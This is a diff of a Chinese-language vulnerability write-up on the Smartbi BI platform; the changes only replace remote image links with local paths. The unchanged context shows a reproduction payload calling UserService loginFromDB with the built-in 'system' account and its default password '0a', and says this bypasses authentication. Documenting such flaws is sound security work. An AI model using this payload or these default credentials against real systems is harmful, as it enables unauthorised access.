@@ -63,7 +63,7 @@ Smartbi 在安装时会内置三个用户（public、service、system），在�
 
 **漏洞复现**
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbXavKLOVbLvyVEERjrBazNrBALE38ZDk1Cchmy83d6cXtIxpSSwGBpeWLo8CHha2vBB3LLBoac5dw/640?wx_fmt=png)
+![](../../.resource/remote/6dac31029c515323d3972413183bd6acb3d431037c4aba5508b6f3815dbac224.png)
 
 payload：
 
@@ -89,7 +89,7 @@ className=UserService&methodName=loginFromDB¶ms=["system","0a"]
 **这里存在三个内置用户【"public"、"service"、"system"】, 默认的口令都是 "0a".  
 **
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbXavKLOVbLvyVEERjrBazNrJWKkcGPjibBFlHZzKtLCNkhsMvw3XQfZVZSC7mWvLXsf8xKS7xmISIQ/640?wx_fmt=png)此时刷新页面即可绕过身份验证进行系统内部
+![](../../.resource/remote/22f5d54a0b87c935c6e9dd38366e2919af379844534091303de91ebbc62a6ce6.png)此时刷新页面即可绕过身份验证进行系统内部
 
 **修复建议**
 
